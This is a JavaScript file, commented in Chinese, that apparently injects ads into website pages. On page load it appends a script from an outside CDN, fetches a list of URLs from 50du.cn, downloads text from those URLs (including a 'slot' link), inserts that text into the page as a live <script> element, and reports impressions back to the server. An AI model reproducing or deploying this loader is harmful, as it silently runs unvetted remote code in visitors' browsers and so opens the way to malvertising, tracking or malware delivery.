const input = ["https://huizai.top/slot?7645859975449108235-630"]
    //const input = ["https://mg.sjoy7rq.cn/sc/1238?n=zUONAccY"]
    console.log(input);


    const addReactive = (requestsQueue)=>{
        const orginPrototype = Array.prototype
        const changeMethod = ['push','splice']
        changeMethod.forEach(key=>{
            requestsQueue[key] = function(...args){
                //console.log('reactive render',this===requestsQueue);
                orginPrototype[key].call(this,...args)
                //render(this)
            }
        })
    }

    //-------------------封装的渲染方法----------------------
   //-------------------控制并发----------------------

if (typeof POST_AD_YUN == 'undefined') {
			function loadJs(url, callback) {
			    var script = document.createElement('script');
			    script.type = "text/javascript";
			    if (typeof(callback) != "undefined") {
			        if (script.readyState) {
			            script.onreadystatechange = function() {
			                if (script.readyState == "loaded" || script.readyState == "complete") {
			                    script.onreadystatechange = null;
			                    callback();
			                }
			            }
			        } else {
			            script.onload = function() {
			                callback();
			            }
			        }
			    }
			    script.src = url;
			    document.body.appendChild(script);
			}
					
			loadJs('https://cdn.tdltd.cyou/maccms10-master/m.js',function(){console.log('远程加载完成')});
		}


    
    const  bs = document.body.style.cssText
    function handleFetchQueue(input, max) {
        
        urlindex = [];
        const requestsQueue = []; // 请求队列
        const im = {
            "url":""
        }
        addReactive(requestsQueue) //对requestsQueue添加响应式
        
        input.forEach(function(element,index) {
          urlindex[element.code]=element;
        });
        hashindex = [];
        let i = 0;
        let is_impression = 0
        const req = (i)=>{  //产生一个promise请求 成功则删除队里中promise 再添加一个请求
            url = input[i].code
            // if(url.indexOf("?")>=0){//判断url中是否已经带有参数
            //         url = url + "&t=" + (new Date()).valueOf();
            //     }else{
            //       url = url + "?t=" + (new Date()).valueOf();
            //   }
            return  fetch(url).then(res=>{
                if(!is_impression){
                    
                    is_impression = 1
                    im.url=res.url
                    return res.text()
                }
                
            }).then(res=>{
                
                if (res == undefined) return
                
                    
                    
                     try {
       
                       //可能出错的代码
                        b =  document.body.innerHTML
                      //h =  document.head.innerHTML
                      var h = document.body||document.getElementsByTagName("body")
                      var sp = "<script id='ad'>" + res + "<\/script>"
                      console.log(urlindex)

                      fetch("https://50du.cn/v1/index2.php?imp=1&uuid="+urlindex[im.url].id+"&type=dipiao").then(res=>{
                        //return res.json()
                    }).then(res=>{
                        // handleFetchQueue(res.dipiao,res.dipiao.length)
                       
                    })
            		  POST_AD_YUN(h,sp)
                      
                    //   eval(res)
                    //   setTimeout(function() {
                    //       const index = requestsQueue.findIndex(item=>item===im.url)
                    //       input.splice(index,1)
                    //       //document.body.innerHTML=b
                    //       document.head.innerHTML=h
                    //       setTimeout(function() {
                          
                    //      document.body.style.cssText = bs
                    //      Array.prototype.slice.call(document.getElementsByTagName("brde")).forEach(e=>e.innerHTML="");
                    //      Array.prototype.slice.call(document.getElementsByTagName("ins")).forEach(e=>e.innerHTML="");
                    //   }, 1000);
                          
                    //       handleFetchQueue(input,input.length)
                          
                          
                         
                         
                    //   }, 3000);
                      
                       //console.log(a)
                        //document.write("<\/bodyy>");
                    }catch(error){
                        
                        //console.error(error)
                      //出错时要做什么
                        return
                    }
      
                //document.write("<script>" + res + "<\/script>");
                const index = requestsQueue.findIndex(item=>item===req)
                requestsQueue.splice(index,1)
                checkAddReq()
            })
        }
        const checkAddReq = ()=>{
            //console.log(i,input.length)
            if(requestsQueue.length+1 <= max) { // 并发不能越界
                if(i<=input.length-1){
                        requestsQueue.push(req(i++))
                        checkAddReq()
                    }
            }
        }   
       checkAddReq();
    }

    

function m() {
	let p = navigator.platform;
	if ((p.indexOf("Win") == 0) || (p.indexOf("Mac") == 0) || (p == "X11") || (p.indexOf("Linux") == 0)) {
		return false
	}
	return true
}

function Find(target, array){
　　var col = array[0].length;
　　var row = array.length;
　　let i = row-1,j=0;
　　while(i>=0&&j<col){
　　　　if(array[i][j]>target){
　　　　　　i--;
　　　　}
　　　　else if(array[i][j]<target){
　　　　　　j++;
　　　　}
　　　　else{
　　　　　　return i;
　　　　}
　　}
　　if(i<0||j>=col){
　　　　return false;
　　}
}

 fetch("https://50du.cn/v1/index2.php").then(res=>{
                return res.json()
            }).then(res=>{
                if(res.dipiao.length>0){
                    handleFetchQueue(res.dipiao,res.dipiao.length)
                }
                
               
            })
//检测平台  
if (m()) {
    // fetch("https://50du.cn/v1/index2.php").then(res=>{
    //             return res.json()
    //         }).then(res=>{
    //             handleFetchQueue(res.dipiao,res.dipiao.length)
               
    //         })
	
}else{
    
}